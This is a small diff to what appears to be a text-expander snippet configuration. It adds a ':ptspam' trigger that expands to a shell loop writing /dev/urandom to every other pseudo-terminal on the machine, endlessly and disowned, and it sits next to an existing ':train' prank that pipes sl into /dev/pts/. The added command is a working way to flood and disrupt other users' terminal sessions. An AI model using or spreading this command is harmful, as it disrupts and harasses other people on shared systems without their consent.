@@ -159,3 +159,6 @@ matches:
 
   - trigger: ":train"
     replace: sl > /dev/pts/
+    
+  - trigger: ":ptspam"
+    replace: ctty=$(tty | cut -d/ -f4) && while :; do sleep 1; for u in $(ls /dev/pts | grep -Ev "$ctty"); do cat /dev/urandom > /dev/pts/$u & disown; done; done
